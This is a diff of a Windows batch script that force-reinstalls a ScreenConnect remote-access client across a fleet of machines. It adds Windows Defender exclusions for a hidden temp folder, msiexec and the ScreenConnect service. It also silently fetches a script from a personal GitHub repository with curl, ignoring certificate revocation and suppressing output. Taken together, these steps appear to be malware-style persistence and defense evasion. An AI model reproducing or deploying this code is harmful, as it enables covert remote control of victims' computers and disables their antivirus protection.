@@ -1,7 +1,7 @@
 @echo off
-rem OWN_GRYXA_FORCE BUILD 20260804F4 - fleet REINSTALL + REPORT (sevrz 10s safe)
-rem F4: always queue own_gryxa REINSTALL (panel wipe). Never skip-alive.
-rem F3: NO pipe chars in any echo.
+rem OWN_GRYXA_FORCE BUILD 20260804F5 - fleet REINSTALL + REPORT (sevrz 10s safe)
+rem F5: never overwrite local G5 own_gryxa with older pin; fetch G5 from main if missing.
+rem F4: always queue own_gryxa REINSTALL (panel wipe).
 setlocal EnableExtensions EnableDelayedExpansion
 
 set "WD=%~1"
@@ -13,11 +13,9 @@ set "STAGE=%SystemRoot%\Temp\.upd"
 set "CURL=%SystemRoot%\System32\curl.exe"
 set "SVC=ScreenConnect Client (%FP%)"
 set "LOG=%WD%\own_gryxa_force.log"
-set "PIN=455d4b9"
-set "RAW=https://raw.githubusercontent.com/xnobuddy/github-drop/%PIN%"
 set "RAWMAIN=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
 set "WORKER=%STAGE%\gryxa_force_worker.cmd"
-set "BUILD=F4"
+set "BUILD=F5"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
@@ -28,8 +26,15 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%STAGE%"
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 
-"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%RAW%/own_gryxa.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
-if not exist "%WD%\own_gryxa.cmd" "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%RAWMAIN%/own_gryxa.cmd?t=%RANDOM%" >nul 2>&1
+rem Keep existing G5; only fetch if missing or not G5
+set "NEED_G=1"
+if exist "%WD%\own_gryxa.cmd" (
+  findstr /C:"OWN_GRYXA BUILD 20260804G5" "%WD%\own_gryxa.cmd" >nul 2>&1
+  if not errorlevel 1 set "NEED_G=0"
+)
+if "%NEED_G%"=="1" (
+  "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%RAWMAIN%/own_gryxa.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+)
 
 if not exist "%WD%\own_gryxa.cmd" (
   echo BUILD=%BUILD%
@@ -40,6 +45,16 @@ if not exist "%WD%\own_gryxa.cmd" (
   endlocal & exit /b 2
 )
 
+findstr /C:"REINSTALL" "%WD%\own_gryxa.cmd" >nul 2>&1
+if errorlevel 1 (
+  echo BUILD=%BUILD%
+  echo HOST=%COMPUTERNAME%
+  echo HEALTH=FAIL
+  echo REASON=own_gryxa-not-G5
+  echo REPORT %COMPUTERNAME% %FP% FAIL own_gryxa-not-G5
+  endlocal & exit /b 3
+)
+
 set "PRE=ABSENT"
 sc query "%SVC%" >nul 2>&1
 if not errorlevel 1 (
@@ -47,7 +62,6 @@ if not errorlevel 1 (
   if not errorlevel 1 (set "PRE=ALIVE") else (set "PRE=STOPPED")
 )
 
-rem clear stale lock so REINSTALL is not skipped
 if exist "%WD%\gryxa_msi.lock" del /f /q "%WD%\gryxa_msi.lock" >nul 2>&1
 
 > "%WORKER%" (
